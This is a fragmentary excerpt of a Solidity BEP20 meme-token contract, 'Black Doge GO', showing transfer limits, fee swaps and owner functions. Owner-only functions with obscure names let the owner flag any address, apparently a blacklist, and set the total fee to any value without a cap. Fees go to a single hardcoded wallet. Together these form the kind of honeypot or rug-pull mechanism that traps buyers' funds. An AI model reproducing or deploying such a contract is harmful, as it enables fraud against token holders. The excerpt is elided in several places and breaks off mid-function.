...
contract Blgego is IBEP20, Auth {
    ...
    string constant _name = "Black Doge GO";
    string constant _symbol = "Blgego";
    ...
    address private marketingFeeReceiver = 0x6453e5D581B64A545f75921A7A570bE71519588D;
    address private buybackFeeReceiver = 0x6453e5D581B64A545f75921A7A570bE71519588D;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Blgego seems to happen Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Blgego seems to happen Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Blgego Transfer seems to happen amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Blgego TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Blgego receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value : amountBNBbuyback, gas : 30000}("");
        require(BuyBackSuccess, "Blgego receiver rejected ETH transfer");
    ...
    function setDLBlgego(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEBlgego(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignToken(address _token) public authorized {
        require(_token != address(this), "Blgego Can't let you take all native token");
